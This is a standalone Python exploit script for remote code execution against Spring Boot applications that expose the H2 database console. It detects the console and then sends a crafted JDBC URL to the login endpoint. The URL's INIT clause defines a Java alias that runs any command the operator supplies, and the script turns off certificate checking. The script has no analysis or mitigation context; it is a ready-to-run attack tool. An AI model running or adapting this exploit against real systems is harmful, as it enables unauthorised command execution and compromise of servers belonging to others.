import requests
import urllib3
import argparse
import sys
import time
from urllib.parse import quote

urllib3.disable_warnings()

class H2SpringBootExploit:
    def __init__(self, target, command="whoami"):
        self.target = target
        self.command = command
        self.h2_console_path = "/h2-console"
        self.headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

    def check_h2_console(self):
        """Check if H2 Console is accessible"""
        try:
            print("[*] Checking H2 Console accessibility...")
            response = requests.get(
                f"{self.target}{self.h2_console_path}",
                verify=False,
                timeout=10
            )
            if response.status_code == 200 and "Welcome to H2" in response.text:
                print("[+] H2 Console is accessible!")
                return True
            else:
                print("[-] H2 Console not found")
                return False
        except Exception as e:
            print(f"[-] Error checking H2 Console: {str(e)}")
            return False

    def generate_payload(self):
        """Generate JDBC URL payload with command execution"""
        # Create Java Runtime execution payload
        java_payload = f'CREATE ALIAS EXEC AS $$String shellexec(String cmd) throws java.io.IOException {{ Runtime.getRuntime().exec(cmd);return ""; }}$$;CALL EXEC(\'{self.command}\')'
        
        # Craft JDBC URL with payload
        jdbc_url = f"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT={java_payload}"
        return jdbc_url

    def exploit(self):
        """Execute the exploit"""
        if not self.check_h2_console():
            return False

        print("[*] Generating payload...")
        jdbc_url = self.generate_payload()

        data = {
            'driver': 'org.h2.Driver',
            'url': jdbc_url,
            'username': 'sa',
            'password': '',
            'test': 'Test Connection'
        }

        try:
            print("[*] Sending exploit payload...")
            response = requests.post(
                f"{self.target}{self.h2_console_path}/login.do",
                headers=self.headers,
                data=data,
                verify=False,
                timeout=15
            )

            if response.status_code == 200:
                print("[+] Exploit payload sent successfully!")
                print("[*] Command execution attempted. Check for effects.")
                return True
            else:
                print(f"[-] Exploit failed. Status code: {response.status_code}")
                return False

        except Exception as e:
            print(f"[-] Error during exploitation: {str(e)}")
            return False

def main():
    parser = argparse.ArgumentParser(description='Spring Boot H2 Database RCE Exploit')
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., http://target:8080)')
    parser.add_argument('-c', '--command', default='whoami', help='Command to execute (default: whoami)')
    args = parser.parse_args()

    print("""
    Spring Boot H2 Database RCE Exploit
    ----------------------------------
    """)

    exploit = H2SpringBootExploit(args.target, args.command)
    exploit.exploit()

if __name__ == "__main__":
    main()
